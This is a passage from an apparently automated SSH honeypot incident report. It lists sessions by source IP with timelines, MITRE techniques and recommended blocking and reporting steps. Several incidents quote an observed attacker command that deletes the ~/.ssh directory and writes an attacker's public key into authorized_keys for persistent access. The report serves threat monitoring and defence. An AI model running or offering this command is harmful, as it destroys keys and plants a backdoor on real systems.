| `2026-06-14 11:51:11` | `cowrie.client.version` |
| `2026-06-14 11:51:11` | `cowrie.client.kex` |
| `2026-06-14 11:51:11` | `cowrie.login.success` |
| `2026-06-14 11:51:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.189.234[.]96` to AbuseIPDB if not already reported
- [ ] Block `103.189.234[.]96` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a71064a20e27

| Field | Detail |
|---|---|
| **Source IP** | `186.68.83[.]105` |
| **First Seen** | 2026-06-14 11:53 |
| **Last Seen** | 2026-06-14 11:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 11:53:51` | `cowrie.session.connect` |
| `2026-06-14 11:53:51` | `cowrie.client.version` |
| `2026-06-14 11:53:52` | `cowrie.client.kex` |
| `2026-06-14 11:53:53` | `cowrie.login.success` |
| `2026-06-14 11:53:54` | `cowrie.session.params` |
| `2026-06-14 11:53:54` | `cowrie.command.input` |
| `2026-06-14 11:53:54` | `cowrie.command.failed` |
| `2026-06-14 11:53:54` | `cowrie.log.closed` |
| `2026-06-14 11:53:55` | `cowrie.session.params` |
| `2026-06-14 11:53:55` | `cowrie.command.input` |
| `2026-06-14 11:53:55` | `cowrie.session.file_download` |
| `2026-06-14 11:53:55` | `cowrie.log.closed` |
| `2026-06-14 11:54:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.68.83[.]105` to AbuseIPDB if not already reported
- [ ] Block `186.68.83[.]105` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4795b6368e9

| Field | Detail |
|---|---|
| **Source IP** | `167.172.93[.]203` |
| **First Seen** | 2026-06-14 11:53 |
| **Last Seen** | 2026-06-14 11:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 11:53:54` | `cowrie.session.connect` |
| `2026-06-14 11:53:54` | `cowrie.client.version` |
| `2026-06-14 11:53:54` | `cowrie.client.kex` |
| `2026-06-14 11:53:54` | `cowrie.login.success` |
| `2026-06-14 11:53:54` | `cowrie.session.params` |
| `2026-06-14 11:53:54` | `cowrie.command.input` |
| `2026-06-14 11:53:54` | `cowrie.command.failed` |
| `2026-06-14 11:53:55` | `cowrie.log.closed` |
| `2026-06-14 11:53:55` | `cowrie.session.params` |
| `2026-06-14 11:53:55` | `cowrie.command.input` |
| `2026-06-14 11:53:55` | `cowrie.session.file_download` |
| `2026-06-14 11:53:55` | `cowrie.log.closed` |
| `2026-06-14 11:53:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.172.93[.]203` to AbuseIPDB if not already reported
- [ ] Block `167.172.93[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c3752420448

| Field | Detail |
|---|---|
| **Source IP** | `167.172.93[.]203` |
| **First Seen** | 2026-06-14 11:53 |
| **Last Seen** | 2026-06-14 11:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 11:53:56` | `cowrie.session.connect` |
| `2026-06-14 11:53:56` | `cowrie.client.version` |
| `2026-06-14 11:53:56` | `cowrie.client.kex` |
| `2026-06-14 11:53:57` | `cowrie.login.success` |
| `2026-06-14 11:53:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.172.93[.]203` to AbuseIPDB if not already reported
- [ ] Block `167.172.93[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-073d4c3b92f8

| Field | Detail |
|---|---|
| **Source IP** | `186.68.83[.]105` |
| **First Seen** | 2026-06-14 11:53 |
| **Last Seen** | 2026-06-14 11:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 11:53:58` | `cowrie.session.connect` |
| `2026-06-14 11:53:58` | `cowrie.client.version` |
| `2026-06-14 11:53:58` | `cowrie.client.kex` |
| `2026-06-14 11:54:00` | `cowrie.login.success` |
| `2026-06-14 11:54:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.68.83[.]105` to AbuseIPDB if not already reported
- [ ] Block `186.68.83[.]105` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-babe29cf85b6

| Field | Detail |
|---|---|
| **Source IP** | `186.68.83[.]105` |
| **First Seen** | 2026-06-14 11:55 |
| **Last Seen** | 2026-06-14 11:56 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 11:55:54` | `cowrie.session.connect` |
| `2026-06-14 11:55:54` | `cowrie.client.version` |
| `2026-06-14 11:55:54` | `cowrie.client.kex` |
| `2026-06-14 11:55:55` | `cowrie.login.success` |
| `2026-06-14 11:55:56` | `cowrie.session.params` |
| `2026-06-14 11:55:56` | `cowrie.command.input` |
| `2026-06-14 11:55:56` | `cowrie.command.failed` |
| `2026-06-14 11:55:57` | `cowrie.log.closed` |
| `2026-06-14 11:55:57` | `cowrie.session.params` |
| `2026-06-14 11:55:57` | `cowrie.command.input` |
| `2026-06-14 11:55:57` | `cowrie.session.file_download` |
| `2026-06-14 11:55:57` | `cowrie.log.closed` |
| `2026-06-14 11:56:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.68.83[.]105` to AbuseIPDB if not already reported
- [ ] Block `186.68.83[.]105` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b9063dbdeae

| Field | Detail |
|---|---|
| **Source IP** | `186.68.83[.]105` |
| **First Seen** | 2026-06-14 11:56 |
| **Last Seen** | 2026-06-14 11:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 11:56:01` | `cowrie.session.connect` |
| `2026-06-14 11:56:01` | `cowrie.client.version` |
| `2026-06-14 11:56:01` | `cowrie.client.kex` |
| `2026-06-14 11:56:02` | `cowrie.login.success` |
| `2026-06-14 11:56:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.68.83[.]105` to AbuseIPDB if not already reported
- [ ] Block `186.68.83[.]105` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81a4fd052e4f

| Field | Detail |
|---|---|
| **Source IP** | `42.51.33[.]162` |
| **First Seen** | 2026-06-14 11:56 |
| **Last Seen** | 2026-06-14 11:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 11:56:33` | `cowrie.session.connect` |
| `2026-06-14 11:56:33` | `cowrie.client.version` |
| `2026-06-14 11:56:34` | `cowrie.client.kex` |
| `2026-06-14 11:56:34` | `cowrie.login.success` |
| `2026-06-14 11:56:35` | `cowrie.session.params` |
| `2026-06-14 11:56:35` | `cowrie.command.input` |
| `2026-06-14 11:56:35` | `cowrie.command.failed` |
| `2026-06-14 11:56:35` | `cowrie.log.closed` |
| `2026-06-14 11:56:35` | `cowrie.session.params` |
| `2026-06-14 11:56:35` | `cowrie.command.input` |
| `2026-06-14 11:56:35` | `cowrie.session.file_download` |
| `2026-06-14 11:56:35` | `cowrie.log.closed` |
| `2026-06-14 11:56:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.51.33[.]162` to AbuseIPDB if not already reported
- [ ] Block `42.51.33[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e9723b40c85

| Field | Detail |
|---|---|
| **Source IP** | `42.51.33[.]162` |
| **First Seen** | 2026-06-14 11:56 |
| **Last Seen** | 2026-06-14 11:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 11:56:37` | `cowrie.session.connect` |
| `2026-06-14 11:56:37` | `cowrie.client.version` |
| `2026-06-14 11:56:37` | `cowrie.client.kex` |
| `2026-06-14 11:56:38` | `cowrie.login.success` |
| `2026-06-14 11:56:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.51.33[.]162` to AbuseIPDB if not already reported
- [ ] Block `42.51.33[.]162` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-220a71177657

| Field | Detail |
|---|---|
| **Source IP** | `124.155.125[.]131` |
| **First Seen** | 2026-06-14 11:56 |
| **Last Seen** | 2026-06-14 11:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 11:56:56` | `cowrie.session.connect` |
| `2026-06-14 11:56:56` | `cowrie.client.version` |
| `2026-06-14 11:56:56` | `cowrie.client.kex` |
| `2026-06-14 11:56:56` | `cowrie.login.success` |
| `2026-06-14 11:56:57` | `cowrie.session.params` |
| `2026-06-14 11:56:57` | `cowrie.command.input` |
| `2026-06-14 11:56:57` | `cowrie.command.failed` |
| `2026-06-14 11:56:57` | `cowrie.log.closed` |
| `2026-06-14 11:56:57` | `cowrie.session.params` |
| `2026-06-14 11:56:57` | `cowrie.command.input` |
| `2026-06-14 11:56:57` | `cowrie.session.file_download` |
| `2026-06-14 11:56:57` | `cowrie.log.closed` |
| `2026-06-14 11:57:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.155.125[.]131` to AbuseIPDB if not already reported
- [ ] Block `124.155.125[.]131` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47426e3a7cc6

| Field | Detail |
|---|---|
| **Source IP** | `124.155.125[.]131` |
| **First Seen** | 2026-06-14 11:56 |
| **Last Seen** | 2026-06-14 11:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 11:56:59` | `cowrie.session.connect` |
| `2026-06-14 11:56:59` | `cowrie.client.version` |
| `2026-06-14 11:57:00` | `cowrie.client.kex` |
| `2026-06-14 11:57:00` | `cowrie.login.success` |
| `2026-06-14 11:57:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.155.125[.]131` to AbuseIPDB if not already reported
- [ ] Block `124.155.125[.]131` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-227fe3046e0e

| Field | Detail |
|---|---|
| **Source IP** | `186.68.83[.]105` |
| **First Seen** | 2026-06-14 11:57 |
| **Last Seen** | 2026-06-14 11:58 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 11:57:55` | `cowrie.session.connect` |
| `2026-06-14 11:57:55` | `cowrie.client.version` |
| `2026-06-14 11:57:55` | `cowrie.client.kex` |
| `2026-06-14 11:57:57` | `cowrie.login.success` |
| `2026-06-14 11:57:57` | `cowrie.session.params` |
| `2026-06-14 11:57:57` | `cowrie.command.input` |
| `2026-06-14 11:57:57` | `cowrie.command.failed` |
| `2026-06-14 11:57:58` | `cowrie.log.closed` |
| `2026-06-14 11:57:58` | `cowrie.session.params` |
| `2026-06-14 11:57:58` | `cowrie.command.input` |
| `2026-06-14 11:57:58` | `cowrie.session.file_download` |
| `2026-06-14 11:57:58` | `cowrie.log.closed` |
| `2026-06-14 11:58:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.68.83[.]105` to AbuseIPDB if not already reported
- [ ] Block `186.68.83[.]105` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fedf009c0fa5

| Field | Detail |
|---|---|
| **Source IP** | `186.68.83[.]105` |
| **First Seen** | 2026-06-14 11:58 |
| **Last Seen** | 2026-06-14 11:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 11:58:02` | `cowrie.session.connect` |
| `2026-06-14 11:58:02` | `cowrie.client.version` |
| `2026-06-14 11:58:02` | `cowrie.client.kex` |
| `2026-06-14 11:58:03` | `cowrie.login.success` |
| `2026-06-14 11:58:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.68.83[.]105` to AbuseIPDB if not already reported
- [ ] Block `186.68.83[.]105` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a89a5d4f82f

| Field | Detail |
|---|---|
| **Source IP** | `167.172.93[.]203` |
| **First Seen** | 2026-06-14 11:58 |
| **Last Seen** | 2026-06-14 11:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 11:58:23` | `cowrie.session.connect` |
| `2026-06-14 11:58:23` | `cowrie.client.version` |
| `2026-06-14 11:58:23` | `cowrie.client.kex` |
| `2026-06-14 11:58:24` | `cowrie.login.success` |
| `2026-06-14 11:58:24` | `cowrie.session.params` |
| `2026-06-14 11:58:24` | `cowrie.command.input` |
| `2026-06-14 11:58:24` | `cowrie.command.failed` |
| `2026-06-14 11:58:24` | `cowrie.log.closed` |
| `2026-06-14 11:58:24` | `cowrie.session.params` |
| `2026-06-14 11:58:24` | `cowrie.command.input` |
| `2026-06-14 11:58:24` | `cowrie.session.file_download` |
| `2026-06-14 11:58:24` | `cowrie.log.closed` |
| `2026-06-14 11:58:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.172.93[.]203` to AbuseIPDB if not already reported
- [ ] Block `167.172.93[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45a087df161a

| Field | Detail |
|---|---|
| **Source IP** | `167.172.93[.]203` |
| **First Seen** | 2026-06-14 11:58 |
| **Last Seen** | 2026-06-14 11:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 11:58:26` | `cowrie.session.connect` |
| `2026-06-14 11:58:26` | `cowrie.client.version` |
| `2026-06-14 11:58:26` | `cowrie.client.kex` |
| `2026-06-14 11:58:26` | `cowrie.login.success` |
| `2026-06-14 11:58:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.172.93[.]203` to AbuseIPDB if not already reported
- [ ] Block `167.172.93[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `157.230.150[.]187` | **113** | 2026-06-14 09:40 | 2026-06-14 12:00 | 76m | 0 | `T1592` | 🟠 MEDIUM |
| `42.51.33[.]162` | **19** | 2026-06-14 11:21 | 2026-06-14 12:00 | 28m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `124.155.125[.]131` | **14** | 2026-06-14 11:31 | 2026-06-14 11:58 | 0m | 14 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `92.204.128[.]6` | **12** | 2026-06-14 09:40 | 2026-06-14 11:51 | 6m | 0 | `T1592` | 🟠 MEDIUM |
| `167.172.93[.]203` | **11** | 2026-06-14 11:34 | 2026-06-14 11:58 | 0m | 11 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `192.227.213[.]228` | **6** | 2026-06-14 10:39 | 2026-06-14 11:11 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `186.68.83[.]105` | **5** | 2026-06-14 11:42 | 2026-06-14 11:58 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `43.133.61[.]150` | **3** | 2026-06-14 10:45 | 2026-06-14 10:48 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `13.58.178[.]22` | **2** | 2026-06-14 09:49 | 2026-06-14 09:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `14.103.123[.]232` | **2** | 2026-06-14 11:43 | 2026-06-14 11:45 | 4m | 0 | `T1592` | 🟢 LOW |
| `20.64.105[.]39` | **2** | 2026-06-14 09:46 | 2026-06-14 09:46 | 0m | 0 | `T1592` | 🟢 LOW |
| `36.50.134[.]129` | **2** | 2026-06-14 09:41 | 2026-06-14 09:44 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `47.254.245[.]237` | **2** | 2026-06-14 09:46 | 2026-06-14 09:46 | 0m | 0 | `T1592` | 🟢 LOW |
| `87.236.176[.]143` | **2** | 2026-06-14 11:12 | 2026-06-14 11:12 | 0m | 0 | `T1592` | 🟢 LOW |
| `92.204.138[.]58` | **2** | 2026-06-14 09:44 | 2026-06-14 09:55 | 1m | 0 | `T1592` | 🟢 LOW |
| `103.189.234[.]96` | 1 | 2026-06-14 11:51 | 2026-06-14 11:51 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.59.163[.]132` | 1 | 2026-06-14 09:40 | 2026-06-14 09:40 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `106.13.69[.]159` | 1 | 2026-06-14 11:52 | 2026-06-14 11:52 | 13s | 0 | `T1592` | 🟢 LOW |
| `114.29.11[.]190` | 1 | 2026-06-14 09:42 | 2026-06-14 09:42 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `115.190.181[.]18` | 1 | 2026-06-14 09:59 | 2026-06-14 10:01 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.190.64[.]245` | 1 | 2026-06-14 11:49 | 2026-06-14 11:50 | 60s | 0 | `T1592` | 🟢 LOW |
| `116.228.233[.]93` | 1 | 2026-06-14 11:39 | 2026-06-14 11:39 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `118.122.147[.]49` | 1 | 2026-06-14 10:08 | 2026-06-14 10:10 | 101s | 0 | `T1592` | 🟢 LOW |
| `14.103.50[.]32` | 1 | 2026-06-14 10:56 | 2026-06-14 10:58 | 120s | 0 | `T1592` | 🟢 LOW |
| `166.62.92[.]145` | 1 | 2026-06-14 10:17 | 2026-06-14 10:17 | 31s | 0 | `T1592` | 🟢 LOW |
| `197.232.46[.]79` | 1 | 2026-06-14 11:15 | 2026-06-14 11:15 | 12s | 0 | `T1592` | 🟢 LOW |
| `220.205.123[.]19` | 1 | 2026-06-14 09:57 | 2026-06-14 09:59 | 120s | 0 | `T1592` | 🟢 LOW |
| `42.51.41[.]137` | 1 | 2026-06-14 11:48 | 2026-06-14 11:50 | 120s | 0 | `T1592` | 🟢 LOW |
| `65.49.1[.]52` | 1 | 2026-06-14 11:20 | 2026-06-14 11:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `76.25.130[.]86` | 1 | 2026-06-14 11:16 | 2026-06-14 11:16 | 31s | 0 | `T1592` | 🟢 LOW |
| `8.222.246[.]27` | 1 | 2026-06-14 10:04 | 2026-06-14 10:05 | 30s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (35 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
